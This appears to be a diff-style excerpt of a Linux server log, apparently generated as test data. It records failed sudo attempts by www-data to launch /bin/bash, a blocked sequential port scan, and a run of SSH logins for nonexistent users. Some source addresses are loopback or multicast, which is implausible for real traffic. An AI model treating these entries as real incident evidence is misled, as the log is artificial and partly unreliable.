+Apr 29 04:58:22 prod-server-01 sudo: www-data : command not allowed ; TTY=pts/1 ; PWD=/var/www ; USER=root ; COMMAND=/bin/bash
+Apr 29 04:58:30 prod-server-01 sudo: pam_unix(sudo:auth): authentication failure; logname= uid=33 euid=0 rhost=192.168.1.200
+Apr 29 04:58:34 prod-server-01 sudo: www-data : command not allowed ; TTY=pts/1 ; PWD=/var/www ; USER=root ; COMMAND=/bin/bash
+Apr 29 04:58:46 prod-server-01 sudo: pam_unix(sudo:auth): authentication failure; logname= uid=33 euid=0 rhost=10.10.10.5
+Apr 29 04:58:51 prod-server-01 sudo: www-data : command not allowed ; TTY=pts/1 ; PWD=/var/www ; USER=root ; COMMAND=/bin/bash
+Apr 29 04:59:00 prod-server-01 sudo: pam_unix(sudo:auth): authentication failure; logname= uid=33 euid=0 rhost=10.10.10.5
+Apr 29 04:59:10 prod-server-01 sudo: www-data : command not allowed ; TTY=pts/1 ; PWD=/var/www ; USER=root ; COMMAND=/bin/bash
+Apr 29 04:59:21 prod-server-01 sudo: pam_unix(sudo:auth): authentication failure; logname= uid=33 euid=0 rhost=10.10.10.5
+Apr 29 04:59:24 prod-server-01 sudo: www-data : command not allowed ; TTY=pts/1 ; PWD=/var/www ; USER=root ; COMMAND=/bin/bash
+Apr 29 04:59:41 prod-server-01 sudo: pam_unix(sudo:auth): authentication failure; logname= uid=33 euid=0 rhost=192.168.1.200
+Apr 29 04:59:45 prod-server-01 sudo: www-data : command not allowed ; TTY=pts/1 ; PWD=/var/www ; USER=root ; COMMAND=/bin/bash
+Apr 29 04:59:55 prod-server-01 sudo: pam_unix(sudo:auth): authentication failure; logname= uid=33 euid=0 rhost=10.10.10.5
+Apr 29 04:59:57 prod-server-01 sudo: www-data : command not allowed ; TTY=pts/1 ; PWD=/var/www ; USER=root ; COMMAND=/bin/bash
+Apr 29 05:00:17 prod-server-01 sudo: pam_unix(sudo:auth): authentication failure; logname= uid=33 euid=0 rhost=192.168.1.200
+Apr 29 05:00:27 prod-server-01 sudo: www-data : command not allowed ; TTY=pts/1 ; PWD=/var/www ; USER=root ; COMMAND=/bin/bash
+Apr 29 05:00:45 prod-server-01 sudo: pam_unix(sudo:auth): authentication failure; logname= uid=33 euid=0 rhost=10.10.10.5
+Apr 29 05:00:47 prod-server-01 sudo: www-data : command not allowed ; TTY=pts/1 ; PWD=/var/www ; USER=root ; COMMAND=/bin/bash
+Apr 29 05:01:04 prod-server-01 sudo: pam_unix(sudo:auth): authentication failure; logname= uid=33 euid=0 rhost=192.168.1.200
+Apr 29 05:01:08 prod-server-01 sudo: www-data : command not allowed ; TTY=pts/1 ; PWD=/var/www ; USER=root ; COMMAND=/bin/bash
+Apr 29 05:01:16 prod-server-01 sudo: pam_unix(sudo:auth): authentication failure; logname= uid=33 euid=0 rhost=192.168.1.200
+Apr 29 05:01:25 prod-server-01 sudo: www-data : command not allowed ; TTY=pts/1 ; PWD=/var/www ; USER=root ; COMMAND=/bin/bash
+Apr 29 05:01:30 prod-server-01 sudo: pam_unix(sudo:auth): authentication failure; logname= uid=33 euid=0 rhost=192.168.1.200
+Apr 29 05:01:32 prod-server-01 sudo: www-data : command not allowed ; TTY=pts/1 ; PWD=/var/www ; USER=root ; COMMAND=/bin/bash
+Apr 29 05:01:49 prod-server-01 sudo: pam_unix(sudo:auth): authentication failure; logname= uid=33 euid=0 rhost=10.10.10.5
+Apr 29 05:01:51 prod-server-01 sudo: www-data : command not allowed ; TTY=pts/1 ; PWD=/var/www ; USER=root ; COMMAND=/bin/bash
+Apr 29 05:02:09 prod-server-01 sudo: pam_unix(sudo:auth): authentication failure; logname= uid=33 euid=0 rhost=10.10.10.5
+Apr 29 05:02:13 prod-server-01 sudo: www-data : command not allowed ; TTY=pts/1 ; PWD=/var/www ; USER=root ; COMMAND=/bin/bash
+Apr 29 05:02:20 prod-server-01 sudo: pam_unix(sudo:auth): authentication failure; logname= uid=33 euid=0 rhost=192.168.1.200
+Apr 29 05:02:29 prod-server-01 sudo: www-data : command not allowed ; TTY=pts/1 ; PWD=/var/www ; USER=root ; COMMAND=/bin/bash
+Apr 29 05:02:34 prod-server-01 sudo: pam_unix(sudo:auth): authentication failure; logname= uid=33 euid=0 rhost=10.10.10.5
+Apr 29 05:02:40 prod-server-01 sudo: www-data : command not allowed ; TTY=pts/1 ; PWD=/var/www ; USER=root ; COMMAND=/bin/bash
+Apr 29 05:02:50 prod-server-01 sudo: pam_unix(sudo:auth): authentication failure; logname= uid=33 euid=0 rhost=10.10.10.5
+Apr 29 05:03:00 prod-server-01 sudo: www-data : command not allowed ; TTY=pts/1 ; PWD=/var/www ; USER=root ; COMMAND=/bin/bash
+Apr 29 05:03:13 prod-server-01 sudo: pam_unix(sudo:auth): authentication failure; logname= uid=33 euid=0 rhost=10.10.10.5
+Apr 29 05:03:18 prod-server-01 sudo: www-data : command not allowed ; TTY=pts/1 ; PWD=/var/www ; USER=root ; COMMAND=/bin/bash
+Apr 29 05:03:33 prod-server-01 sudo: pam_unix(sudo:auth): authentication failure; logname= uid=33 euid=0 rhost=10.10.10.5
+Apr 29 05:03:38 prod-server-01 kernel: [UFW BLOCK] IN=eth0 SRC=198.51.100.88 DST=10.0.1.1 PROTO=TCP DPT=20 SYN
+Apr 29 05:03:39 prod-server-01 kernel: [UFW BLOCK] IN=eth0 SRC=198.51.100.88 DST=10.0.1.1 PROTO=TCP DPT=21 SYN
+Apr 29 05:03:39 prod-server-01 kernel: [UFW BLOCK] IN=eth0 SRC=198.51.100.88 DST=10.0.1.1 PROTO=TCP DPT=22 SYN
+Apr 29 05:03:40 prod-server-01 kernel: [UFW BLOCK] IN=eth0 SRC=198.51.100.88 DST=10.0.1.1 PROTO=TCP DPT=23 SYN
+Apr 29 05:03:41 prod-server-01 kernel: [UFW BLOCK] IN=eth0 SRC=198.51.100.88 DST=10.0.1.1 PROTO=TCP DPT=24 SYN
+Apr 29 05:03:41 prod-server-01 kernel: [UFW BLOCK] IN=eth0 SRC=198.51.100.88 DST=10.0.1.1 PROTO=TCP DPT=25 SYN
+Apr 29 05:03:42 prod-server-01 kernel: [UFW BLOCK] IN=eth0 SRC=198.51.100.88 DST=10.0.1.1 PROTO=TCP DPT=26 SYN
+Apr 29 05:03:43 prod-server-01 kernel: [UFW BLOCK] IN=eth0 SRC=198.51.100.88 DST=10.0.1.1 PROTO=TCP DPT=27 SYN
+Apr 29 05:03:43 prod-server-01 kernel: [UFW BLOCK] IN=eth0 SRC=198.51.100.88 DST=10.0.1.1 PROTO=TCP DPT=28 SYN
+Apr 29 05:03:44 prod-server-01 kernel: [UFW BLOCK] IN=eth0 SRC=198.51.100.88 DST=10.0.1.1 PROTO=TCP DPT=29 SYN
+Apr 29 05:03:44 prod-server-01 kernel: [UFW BLOCK] IN=eth0 SRC=198.51.100.88 DST=10.0.1.1 PROTO=TCP DPT=30 SYN
+Apr 29 05:03:44 prod-server-01 kernel: [UFW BLOCK] IN=eth0 SRC=198.51.100.88 DST=10.0.1.1 PROTO=TCP DPT=31 SYN
+Apr 29 05:03:45 prod-server-01 kernel: [UFW BLOCK] IN=eth0 SRC=198.51.100.88 DST=10.0.1.1 PROTO=TCP DPT=32 SYN
+Apr 29 05:03:46 prod-server-01 kernel: [UFW BLOCK] IN=eth0 SRC=198.51.100.88 DST=10.0.1.1 PROTO=TCP DPT=33 SYN
+Apr 29 05:03:46 prod-server-01 kernel: [UFW BLOCK] IN=eth0 SRC=198.51.100.88 DST=10.0.1.1 PROTO=TCP DPT=34 SYN
+Apr 29 05:03:47 prod-server-01 kernel: [UFW BLOCK] IN=eth0 SRC=198.51.100.88 DST=10.0.1.1 PROTO=TCP DPT=35 SYN
+Apr 29 05:03:47 prod-server-01 kernel: [UFW BLOCK] IN=eth0 SRC=198.51.100.88 DST=10.0.1.1 PROTO=TCP DPT=36 SYN
+Apr 29 05:03:47 prod-server-01 kernel: [UFW BLOCK] IN=eth0 SRC=198.51.100.88 DST=10.0.1.1 PROTO=TCP DPT=37 SYN
+Apr 29 05:03:48 prod-server-01 kernel: [UFW BLOCK] IN=eth0 SRC=198.51.100.88 DST=10.0.1.1 PROTO=TCP DPT=38 SYN
+Apr 29 05:03:49 prod-server-01 kernel: [UFW BLOCK] IN=eth0 SRC=198.51.100.88 DST=10.0.1.1 PROTO=TCP DPT=39 SYN
+Apr 29 05:03:49 prod-server-01 kernel: [UFW BLOCK] IN=eth0 SRC=198.51.100.88 DST=10.0.1.1 PROTO=TCP DPT=40 SYN
+Apr 29 05:03:50 prod-server-01 kernel: [UFW BLOCK] IN=eth0 SRC=198.51.100.88 DST=10.0.1.1 PROTO=TCP DPT=41 SYN
+Apr 29 05:03:51 prod-server-01 kernel: [UFW BLOCK] IN=eth0 SRC=198.51.100.88 DST=10.0.1.1 PROTO=TCP DPT=42 SYN
+Apr 29 05:03:51 prod-server-01 kernel: [UFW BLOCK] IN=eth0 SRC=198.51.100.88 DST=10.0.1.1 PROTO=TCP DPT=43 SYN
+Apr 29 05:03:52 prod-server-01 kernel: [UFW BLOCK] IN=eth0 SRC=198.51.100.88 DST=10.0.1.1 PROTO=TCP DPT=44 SYN
+Apr 29 05:03:53 prod-server-01 kernel: [UFW BLOCK] IN=eth0 SRC=198.51.100.88 DST=10.0.1.1 PROTO=TCP DPT=45 SYN
+Apr 29 05:03:54 prod-server-01 kernel: [UFW BLOCK] IN=eth0 SRC=198.51.100.88 DST=10.0.1.1 PROTO=TCP DPT=46 SYN
+Apr 29 05:03:54 prod-server-01 kernel: [UFW BLOCK] IN=eth0 SRC=198.51.100.88 DST=10.0.1.1 PROTO=TCP DPT=47 SYN
+Apr 29 05:03:54 prod-server-01 kernel: [UFW BLOCK] IN=eth0 SRC=198.51.100.88 DST=10.0.1.1 PROTO=TCP DPT=48 SYN
+Apr 29 05:03:55 prod-server-01 kernel: [UFW BLOCK] IN=eth0 SRC=198.51.100.88 DST=10.0.1.1 PROTO=TCP DPT=49 SYN
+Apr 29 05:03:55 prod-server-01 kernel: [UFW BLOCK] IN=eth0 SRC=198.51.100.88 DST=10.0.1.1 PROTO=TCP DPT=50 SYN
+Apr 29 05:03:56 prod-server-01 kernel: [UFW BLOCK] IN=eth0 SRC=198.51.100.88 DST=10.0.1.1 PROTO=TCP DPT=51 SYN
+Apr 29 05:03:57 prod-server-01 kernel: [UFW BLOCK] IN=eth0 SRC=198.51.100.88 DST=10.0.1.1 PROTO=TCP DPT=52 SYN
+Apr 29 05:03:58 prod-server-01 kernel: [UFW BLOCK] IN=eth0 SRC=198.51.100.88 DST=10.0.1.1 PROTO=TCP DPT=53 SYN
+Apr 29 05:03:58 prod-server-01 kernel: [UFW BLOCK] IN=eth0 SRC=198.51.100.88 DST=10.0.1.1 PROTO=TCP DPT=54 SYN
+Apr 29 05:03:58 prod-server-01 kernel: [UFW BLOCK] IN=eth0 SRC=198.51.100.88 DST=10.0.1.1 PROTO=TCP DPT=55 SYN
+Apr 29 05:03:59 prod-server-01 kernel: [UFW BLOCK] IN=eth0 SRC=198.51.100.88 DST=10.0.1.1 PROTO=TCP DPT=56 SYN
+Apr 29 05:04:00 prod-server-01 kernel: [UFW BLOCK] IN=eth0 SRC=198.51.100.88 DST=10.0.1.1 PROTO=TCP DPT=57 SYN
+Apr 29 05:04:01 prod-server-01 kernel: [UFW BLOCK] IN=eth0 SRC=198.51.100.88 DST=10.0.1.1 PROTO=TCP DPT=58 SYN
+Apr 29 05:04:02 prod-server-01 kernel: [UFW BLOCK] IN=eth0 SRC=198.51.100.88 DST=10.0.1.1 PROTO=TCP DPT=59 SYN
+Apr 29 05:04:03 prod-server-01 kernel: [UFW BLOCK] IN=eth0 SRC=198.51.100.88 DST=10.0.1.1 PROTO=TCP DPT=60 SYN
+Apr 29 05:04:04 prod-server-01 kernel: [UFW BLOCK] IN=eth0 SRC=198.51.100.88 DST=10.0.1.1 PROTO=TCP DPT=61 SYN
+Apr 29 05:04:05 prod-server-01 kernel: [UFW BLOCK] IN=eth0 SRC=198.51.100.88 DST=10.0.1.1 PROTO=TCP DPT=62 SYN
+Apr 29 05:04:05 prod-server-01 kernel: [UFW BLOCK] IN=eth0 SRC=198.51.100.88 DST=10.0.1.1 PROTO=TCP DPT=63 SYN
+Apr 29 05:04:05 prod-server-01 kernel: [UFW BLOCK] IN=eth0 SRC=198.51.100.88 DST=10.0.1.1 PROTO=TCP DPT=64 SYN
+Apr 29 05:04:06 prod-server-01 kernel: [UFW BLOCK] IN=eth0 SRC=198.51.100.88 DST=10.0.1.1 PROTO=TCP DPT=65 SYN
+Apr 29 05:04:06 prod-server-01 kernel: [UFW BLOCK] IN=eth0 SRC=198.51.100.88 DST=10.0.1.1 PROTO=TCP DPT=66 SYN
+Apr 29 05:04:07 prod-server-01 kernel: [UFW BLOCK] IN=eth0 SRC=198.51.100.88 DST=10.0.1.1 PROTO=TCP DPT=67 SYN
+Apr 29 05:04:07 prod-server-01 kernel: [UFW BLOCK] IN=eth0 SRC=198.51.100.88 DST=10.0.1.1 PROTO=TCP DPT=68 SYN
+Apr 29 05:04:08 prod-server-01 kernel: [UFW BLOCK] IN=eth0 SRC=198.51.100.88 DST=10.0.1.1 PROTO=TCP DPT=69 SYN
+Apr 29 05:04:08 prod-server-01 kernel: [UFW BLOCK] IN=eth0 SRC=198.51.100.88 DST=10.0.1.1 PROTO=TCP DPT=70 SYN
+Apr 29 05:04:09 prod-server-01 kernel: [UFW BLOCK] IN=eth0 SRC=198.51.100.88 DST=10.0.1.1 PROTO=TCP DPT=71 SYN
+Apr 29 05:04:10 prod-server-01 kernel: [UFW BLOCK] IN=eth0 SRC=198.51.100.88 DST=10.0.1.1 PROTO=TCP DPT=72 SYN
+Apr 29 05:04:10 prod-server-01 kernel: [UFW BLOCK] IN=eth0 SRC=198.51.100.88 DST=10.0.1.1 PROTO=TCP DPT=73 SYN
+Apr 29 05:04:10 prod-server-01 kernel: [UFW BLOCK] IN=eth0 SRC=198.51.100.88 DST=10.0.1.1 PROTO=TCP DPT=74 SYN
+Apr 29 05:04:10 prod-server-01 kernel: [UFW BLOCK] IN=eth0 SRC=198.51.100.88 DST=10.0.1.1 PROTO=TCP DPT=75 SYN
+Apr 29 05:04:10 prod-server-01 kernel: [UFW BLOCK] IN=eth0 SRC=198.51.100.88 DST=10.0.1.1 PROTO=TCP DPT=76 SYN
+Apr 29 05:04:11 prod-server-01 kernel: [UFW BLOCK] IN=eth0 SRC=198.51.100.88 DST=10.0.1.1 PROTO=TCP DPT=77 SYN
+Apr 29 05:04:11 prod-server-01 kernel: [UFW BLOCK] IN=eth0 SRC=198.51.100.88 DST=10.0.1.1 PROTO=TCP DPT=78 SYN
+Apr 29 05:04:11 prod-server-01 kernel: [UFW BLOCK] IN=eth0 SRC=198.51.100.88 DST=10.0.1.1 PROTO=TCP DPT=79 SYN
+Apr 29 05:04:11 prod-server-01 kernel: [UFW BLOCK] IN=eth0 SRC=198.51.100.88 DST=10.0.1.1 PROTO=TCP DPT=80 SYN
+Apr 29 05:04:12 prod-server-01 kernel: [UFW BLOCK] IN=eth0 SRC=198.51.100.88 DST=10.0.1.1 PROTO=TCP DPT=81 SYN
+Apr 29 05:04:13 prod-server-01 kernel: [UFW BLOCK] IN=eth0 SRC=198.51.100.88 DST=10.0.1.1 PROTO=TCP DPT=82 SYN
+Apr 29 05:04:13 prod-server-01 kernel: [UFW BLOCK] IN=eth0 SRC=198.51.100.88 DST=10.0.1.1 PROTO=TCP DPT=83 SYN
+Apr 29 05:04:14 prod-server-01 kernel: [UFW BLOCK] IN=eth0 SRC=198.51.100.88 DST=10.0.1.1 PROTO=TCP DPT=84 SYN
+Apr 29 05:04:14 prod-server-01 kernel: [UFW BLOCK] IN=eth0 SRC=198.51.100.88 DST=10.0.1.1 PROTO=TCP DPT=85 SYN
+Apr 29 05:04:14 prod-server-01 kernel: [UFW BLOCK] IN=eth0 SRC=198.51.100.88 DST=10.0.1.1 PROTO=TCP DPT=86 SYN
+Apr 29 05:04:14 prod-server-01 kernel: [UFW BLOCK] IN=eth0 SRC=198.51.100.88 DST=10.0.1.1 PROTO=TCP DPT=87 SYN
+Apr 29 05:04:15 prod-server-01 kernel: [UFW BLOCK] IN=eth0 SRC=198.51.100.88 DST=10.0.1.1 PROTO=TCP DPT=88 SYN
+Apr 29 05:04:15 prod-server-01 kernel: [UFW BLOCK] IN=eth0 SRC=198.51.100.88 DST=10.0.1.1 PROTO=TCP DPT=89 SYN
+Apr 29 05:04:15 prod-server-01 kernel: [UFW BLOCK] IN=eth0 SRC=198.51.100.88 DST=10.0.1.1 PROTO=TCP DPT=90 SYN
+Apr 29 05:04:16 prod-server-01 kernel: [UFW BLOCK] IN=eth0 SRC=198.51.100.88 DST=10.0.1.1 PROTO=TCP DPT=91 SYN
+Apr 29 05:04:16 prod-server-01 kernel: [UFW BLOCK] IN=eth0 SRC=198.51.100.88 DST=10.0.1.1 PROTO=TCP DPT=92 SYN
+Apr 29 05:04:17 prod-server-01 kernel: [UFW BLOCK] IN=eth0 SRC=198.51.100.88 DST=10.0.1.1 PROTO=TCP DPT=93 SYN
+Apr 29 05:04:17 prod-server-01 kernel: [UFW BLOCK] IN=eth0 SRC=198.51.100.88 DST=10.0.1.1 PROTO=TCP DPT=94 SYN
+Apr 29 05:04:17 prod-server-01 kernel: [UFW BLOCK] IN=eth0 SRC=198.51.100.88 DST=10.0.1.1 PROTO=TCP DPT=95 SYN
+Apr 29 05:04:18 prod-server-01 kernel: [UFW BLOCK] IN=eth0 SRC=198.51.100.88 DST=10.0.1.1 PROTO=TCP DPT=96 SYN
+Apr 29 05:04:18 prod-server-01 kernel: [UFW BLOCK] IN=eth0 SRC=198.51.100.88 DST=10.0.1.1 PROTO=TCP DPT=97 SYN
+Apr 29 05:04:18 prod-server-01 kernel: [UFW BLOCK] IN=eth0 SRC=198.51.100.88 DST=10.0.1.1 PROTO=TCP DPT=98 SYN
+Apr 29 05:04:19 prod-server-01 kernel: [UFW BLOCK] IN=eth0 SRC=198.51.100.88 DST=10.0.1.1 PROTO=TCP DPT=99 SYN
+Apr 29 05:04:20 prod-server-01 kernel: [UFW BLOCK] IN=eth0 SRC=198.51.100.88 DST=10.0.1.1 PROTO=TCP DPT=100 SYN
+Apr 29 05:04:21 prod-server-01 kernel: [UFW BLOCK] IN=eth0 SRC=198.51.100.88 DST=10.0.1.1 PROTO=TCP DPT=101 SYN
+Apr 29 05:04:22 prod-server-01 kernel: [UFW BLOCK] IN=eth0 SRC=198.51.100.88 DST=10.0.1.1 PROTO=TCP DPT=102 SYN
+Apr 29 05:04:22 prod-server-01 kernel: [UFW BLOCK] IN=eth0 SRC=198.51.100.88 DST=10.0.1.1 PROTO=TCP DPT=103 SYN
+Apr 29 05:04:23 prod-server-01 kernel: [UFW BLOCK] IN=eth0 SRC=198.51.100.88 DST=10.0.1.1 PROTO=TCP DPT=104 SYN
+Apr 29 05:04:23 prod-server-01 kernel: [UFW BLOCK] IN=eth0 SRC=198.51.100.88 DST=10.0.1.1 PROTO=TCP DPT=105 SYN
+Apr 29 05:04:23 prod-server-01 kernel: [UFW BLOCK] IN=eth0 SRC=198.51.100.88 DST=10.0.1.1 PROTO=TCP DPT=106 SYN
+Apr 29 05:04:23 prod-server-01 kernel: [UFW BLOCK] IN=eth0 SRC=198.51.100.88 DST=10.0.1.1 PROTO=TCP DPT=107 SYN
+Apr 29 05:04:23 prod-server-01 kernel: [UFW BLOCK] IN=eth0 SRC=198.51.100.88 DST=10.0.1.1 PROTO=TCP DPT=108 SYN
+Apr 29 05:04:24 prod-server-01 kernel: [UFW BLOCK] IN=eth0 SRC=198.51.100.88 DST=10.0.1.1 PROTO=TCP DPT=109 SYN
+Apr 29 05:04:24 prod-server-01 kernel: [UFW BLOCK] IN=eth0 SRC=198.51.100.88 DST=10.0.1.1 PROTO=TCP DPT=110 SYN
+Apr 29 05:04:25 prod-server-01 kernel: [UFW BLOCK] IN=eth0 SRC=198.51.100.88 DST=10.0.1.1 PROTO=TCP DPT=111 SYN
+Apr 29 05:04:25 prod-server-01 kernel: [UFW BLOCK] IN=eth0 SRC=198.51.100.88 DST=10.0.1.1 PROTO=TCP DPT=112 SYN
+Apr 29 05:04:26 prod-server-01 kernel: [UFW BLOCK] IN=eth0 SRC=198.51.100.88 DST=10.0.1.1 PROTO=TCP DPT=113 SYN
+Apr 29 05:04:26 prod-server-01 kernel: [UFW BLOCK] IN=eth0 SRC=198.51.100.88 DST=10.0.1.1 PROTO=TCP DPT=114 SYN
+Apr 29 05:04:26 prod-server-01 kernel: [UFW BLOCK] IN=eth0 SRC=198.51.100.88 DST=10.0.1.1 PROTO=TCP DPT=115 SYN
+Apr 29 05:04:26 prod-server-01 kernel: [UFW BLOCK] IN=eth0 SRC=198.51.100.88 DST=10.0.1.1 PROTO=TCP DPT=116 SYN
+Apr 29 05:04:27 prod-server-01 kernel: [UFW BLOCK] IN=eth0 SRC=198.51.100.88 DST=10.0.1.1 PROTO=TCP DPT=117 SYN
+Apr 29 05:04:27 prod-server-01 kernel: [UFW BLOCK] IN=eth0 SRC=198.51.100.88 DST=10.0.1.1 PROTO=TCP DPT=118 SYN
+Apr 29 05:04:27 prod-server-01 kernel: [UFW BLOCK] IN=eth0 SRC=198.51.100.88 DST=10.0.1.1 PROTO=TCP DPT=119 SYN
+Apr 29 05:04:27 prod-server-01 sshd[9249]: Invalid user ftp from 210.131.12.115
+Apr 29 05:04:41 prod-server-01 sshd[1378]: Invalid user ftp from 39.101.99.123
+Apr 29 05:05:06 prod-server-01 sshd[8353]: Invalid user user from 88.160.108.202
+Apr 29 05:05:28 prod-server-01 sshd[3151]: Invalid user user from 107.69.176.93
+Apr 29 05:05:40 prod-server-01 sshd[9483]: Invalid user guest from 127.177.58.165
+Apr 29 05:05:46 prod-server-01 sshd[2529]: Invalid user ftp from 141.72.57.108
+Apr 29 05:06:15 prod-server-01 sshd[6448]: Invalid user guest from 237.49.183.49
+Apr 29 05:06:25 prod-server-01 sshd[4757]: Invalid user ftp from 90.54.132.9
+Apr 29 05:06:33 prod-server-01 sshd[1795]: Invalid user user from 16.52.43.166
+Apr 29 05:06:48 prod-server-01 sshd[9836]: Invalid user ftp from 63.145.71.129
+Apr 29 05:06:53 prod-server-01 sshd[1705]: Invalid user guest from 81.224.7.229
+Apr 29 05:07:16 prod-server-01 sshd[2416]: Invalid user ftp from 48.128.40.137
+Apr 29 05:07:34 prod-server-01 sshd[9646]: Invalid user guest from 206.9.243.63
+Apr 29 05:07:39 prod-server-01 sshd[9147]: Invalid user guest from 176.127.86.13
+Apr 29 05:07:55 prod-server-01 sshd[9233]: Invalid user user from 187.51.219.26
+Apr 29 05:08:16 prod-server-01 sshd[1013]: Invalid user test from 133.202.171.128
+Apr 29 05:08:42 prod-server-01 sshd[6909]: Invalid user guest from 188.180.96.163
+Apr 29 05:09:05 prod-server-01 sshd[7234]: Invalid user test from 82.8.21.127
+Apr 29 05:09:11 prod-server-01 sshd[4580]: Invalid user test from 29.208.244.130
+Apr 29 05:09:19 prod-server-01 sshd[7467]: Invalid user user from 6.230.246.16
+Apr 29 05:09:41 prod-server-01 sshd[3632]: Invalid user user from 28.54.47.189
+Apr 29 05:10:02 prod-server-01 sshd[1302]: Invalid user test from 35.110.153.230
+Apr 29 05:10:29 prod-server-01 sshd[1842]: Invalid user guest from 182.4.7.165
+Apr 29 05:10:39 prod-server-01 sshd[9534]: Invalid user ftp from 140.31.251.41
+Apr 29 05:10:55 prod-server-01 sshd[9478]: Invalid user guest from 206.72.228.120
+Apr 29 05:11:04 prod-server-01 sshd[5063]: Invalid user user from 50.202.191.145
+Apr 29 05:11:11 prod-server-01 sshd[8510]: Invalid user user from 234.190.180.35
+Apr 29 05:11:20 prod-server-01 sshd[6117]: Invalid user ftp from 67.205.172.74
+Apr 29 05:11:39 prod-server-01 sshd[2762]: Invalid user guest from 34.89.193.167
+Apr 29 05:12:03 prod-server-01 sshd[9979]: Invalid user guest from 141.224.169.253
+Apr 29 05:12:10 prod-server-01 sshd[2142]: Invalid user ftp from 163.32.130.213
+Apr 29 05:12:32 prod-server-01 sshd[6853]: Invalid user test from 222.152.135.206
+Apr 29 05:12:56 prod-server-01 sshd[9479]: Invalid user user from 188.178.80.144
+Apr 29 05:13:16 prod-server-01 sshd[4618]: Invalid user guest from 85.28.158.140
+Apr 29 05:13:41 prod-server-01 sshd[7137]: Invalid user user from 21.12.65.125
+Apr 29 05:13:52 prod-server-01 sshd[1093]: Invalid user test from 66.48.100.105
+Apr 29 05:14:11 prod-server-01 sshd[3436]: Invalid user user from 95.43.222.136
+Apr 29 05:14:36 prod-server-01 sshd[3614]: Invalid user test from 88.77.64.15
+Apr 29 05:14:47 prod-server-01 sshd[2947]: Invalid user guest from 82.94.225.224
+Apr 29 05:15:15 prod-server-01 sshd[1009]: Invalid user guest from 220.105.182.197
+Apr 29 05:15:41 prod-server-01 sshd[3516]: Invalid user user from 170.150.202.74
+Apr 29 05:15:50 prod-server-01 sshd[9240]: Invalid user user from 135.200.179.30
+Apr 29 05:15:59 prod-server-01 sshd[9422]: Invalid user guest from 179.183.83.12
+Apr 29 05:16:15 prod-server-01 sshd[8098]: Invalid user guest from 156.202.252.20
+Apr 29 05:16:43 prod-server-01 sshd[7115]: Invalid user ftp from 105.114.147.117
+Apr 29 05:17:00 prod-server-01 sshd[6929]: Invalid user test from 142.57.63.90
+Apr 29 05:17:21 prod-server-01 sshd[1438]: Invalid user ftp from 168.44.228.184
+Apr 29 05:17:36 prod-server-01 sshd[4133]: Invalid user guest from 123.246.21.39
+Apr 29 05:17:48 prod-server-01 sshd[2698]: Invalid user ftp from 91.23.87.191
+Apr 29 05:17:57 prod-server-01 sshd[8645]: Invalid user guest from 21.150.33.175
+Apr 29 05:18:15 prod-server-01 sshd[4893]: Invalid user ftp from 53.91.106.25
+Apr 29 05:18:40 prod-server-01 sshd[9620]: Invalid user guest from 204.42.213.148
+Apr 29 05:19:09 prod-server-01 sshd[6680]: Invalid user ftp from 251.127.52.238
+Apr 29 05:19:16 prod-server-01 sshd[5709]: Invalid user ftp from 186.247.128.65
+Apr 29 05:19:31 prod-server-01 sshd[6903]: Invalid user ftp from 108.92.220.135
+Apr 29 05:19:44 prod-server-01 sshd[5757]: Invalid user user from 103.134.24.57
+Apr 29 05:20:13 prod-server-01 sshd[3901]: Invalid user user from 167.20.64.115
+Apr 29 05:20:26 prod-server-01 sshd[8403]: Invalid user user from 69.91.97.178
+Apr 29 05:20:56 prod-server-01 sshd[5267]: Invalid user user from 6.10.7.133
+Apr 29 05:21:07 prod-server-01 sshd[8643]: Invalid user test from 209.234.195.3
+Apr 29 05:21:30 prod-server-01 sshd[8688]: Invalid user ftp from 115.78.124.105
+Apr 29 05:21:54 prod-server-01 sshd[2624]: Invalid user test from 77.166.96.225
+Apr 29 05:22:00 prod-server-01 sshd[7207]: Invalid user guest from 84.67.151.237
+Apr 29 05:22:20 prod-server-01 sshd[3485]: Invalid user ftp from 16.244.41.95
+Apr 29 05:22:34 prod-server-01 sshd[7291]: Invalid user test from 198.129.30.173
+Apr 29 05:22:57 prod-server-01 sshd[3572]: Invalid user ftp from 197.15.171.133
+Apr 29 05:23:11 prod-server-01 sshd[5456]: Invalid user user from 80.172.14.68
+Apr 29 05:23:23 prod-server-01 sshd[2873]: Invalid user ftp from 202.16.27.10
+Apr 29 05:23:41 prod-server-01 sshd[8628]: Invalid user test from 251.237.250.78
+Apr 29 05:23:52 prod-server-01 sshd[6944]: Invalid user test from 145.63.240.66
+Apr 29 05:24:19 prod-server-01 sshd[7555]: Invalid user ftp from 159.35.20.224
+Apr 29 05:24:32 prod-server-01 sshd[4734]: Invalid user user from 197.245.137.213
+Apr 29 05:24:45 prod-server-01 sshd[1223]: Invalid user user from 15.61.216.180
+Apr 29 05:24:56 prod-server-01 sshd[2614]: Invalid user guest from 86.102.217.28
+Apr 29 05:25:08 prod-server-01 sshd[9856]: Invalid user test from 237.115.9.23
+Apr 29 05:25:25 prod-server-01 sshd[9111]: Invalid user ftp from 23.97.65.220
+Apr 29 05:25:36 prod-server-01 sshd[7641]: Invalid user guest from 107.8.62.222
+Apr 29 05:26:02 prod-server-01 sshd[1763]: Invalid user ftp from 193.147.244.226
+Apr 29 05:26:23 prod-server-01 sshd[9262]: Invalid user guest from 117.175.136.112
+Apr 29 05:26:35 prod-server-01 sshd[4288]: Invalid user ftp from 7.28.124.8
+Apr 29 05:27:03 prod-server-01 sshd[7835]: Invalid user ftp from 210.120.58.1
+Apr 29 05:27:12 prod-server-01 sshd[9793]: Invalid user test from 229.189.35.41
+Apr 29 05:27:27 prod-server-01 sshd[8795]: Invalid user user from 73.178.52.14
+Apr 29 05:27:46 prod-server-01 sshd[6057]: Invalid user ftp from 188.177.234.202
+Apr 29 05:28:15 prod-server-01 sshd[7362]: Invalid user ftp from 129.52.127.245
+Apr 29 05:28:25 prod-server-01 sshd[9291]: Invalid user ftp from 78.53.156.190
+Apr 29 05:28:33 prod-server-01 sshd[8390]: Invalid user user from 127.177.82.64
+Apr 29 05:28:42 prod-server-01 sshd[9356]: Invalid user ftp from 77.140.143.104
+Apr 29 05:28:51 prod-server-01 sshd[6072]: Invalid user test from 198.186.244.157
+Apr 29 05:29:11 prod-server-01 sshd[7538]: Invalid user ftp from 17.69.133.231
+Apr 29 05:29:27 prod-server-01 sshd[5556]: Invalid user ftp from 150.183.229.196
+Apr 29 05:29:54 prod-server-01 sshd[7145]: Invalid user ftp from 69.68.182.31
+Apr 29 05:30:20 prod-server-01 sshd[2406]: Invalid user user from 3.179.33.50
+Apr 29 05:30:32 prod-server-01 sshd[5783]: Invalid user ftp from 162.1.184.122
